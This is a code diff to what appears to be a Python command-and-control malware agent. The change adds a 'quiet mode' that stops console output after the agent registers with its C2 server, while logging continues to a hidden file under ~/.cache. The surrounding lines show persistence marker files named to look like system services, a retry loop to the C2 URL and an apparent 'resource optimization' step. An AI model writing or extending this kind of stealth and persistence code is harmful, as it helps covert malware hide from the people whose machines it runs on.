@@ -32,6 +32,7 @@ JITTER   = int(os.environ.get("JITTER", "5"))   # Lower jitter
 ENC_KEY  = os.environ.get("ENC_KEY",   "")
 AUTH_TOKEN = os.environ.get("AUTH_TOKEN", "")
 DEBUG    = os.environ.get("C2_DEBUG",  "1")  # Enable debug by default
+QUIET_MODE = True  # After registration, only log to file (not stdout)
 
 # Persistence marker file
 PERSIST_MARKER = Path.home() / ".cache" / ".system_services" / ".agent_initialized"
@@ -57,13 +58,19 @@ AGENT_ID = get_agent_id()
 PERSIST_MARKER = os.path.expanduser("~/.cache/.system_update_marker")
 
 # ─── Debug Logger ──────────────────────────────────────────────────────────────
+_stdout_enabled = True  # Global flag for stdout logging
+
 def log(msg, level="INFO"):
     """Detailed logging with timestamp."""
+    global _stdout_enabled
     ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
     prefix = f"[{ts}] [C2-{level}]"
-    if DEBUG == "1" or level in ("ERROR", "WARN", "START"):
+    
+    # Only print to stdout if enabled (disabled after registration in QUIET_MODE)
+    if _stdout_enabled and (DEBUG == "1" or level in ("ERROR", "WARN", "START")):
         print(f"{prefix} {msg}")
-    # Also write to log file for persistence
+    
+    # Always write to log file for persistence
     try:
         log_dir = os.path.expanduser("~/.cache")
         os.makedirs(log_dir, exist_ok=True)
@@ -71,6 +78,11 @@ def log(msg, level="INFO"):
             f.write(f"{prefix} {msg}\n")
     except:
         pass
+
+def disable_stdout_logging():
+    """Disable stdout logging - agent goes quiet after registration."""
+    global _stdout_enabled
+    _stdout_enabled = False
 
 def log_connection_attempt(url, attempt, error=None):
     """Log connection attempt with full details."""
@@ -827,6 +839,12 @@ def main():
                     log("Resource optimization started", "START")
                 except Exception as e:
                     log(f"Resource optimization failed: {e}", "WARN")
+            
+            # Go quiet after successful registration
+            if QUIET_MODE:
+                log("Going quiet - further logs only in ~/.cache/.system_update.log", "START")
+                disable_stdout_logging()
+            
             break
         except URLError as e:
             log_connection_attempt(C2_URL, retry_count, e)
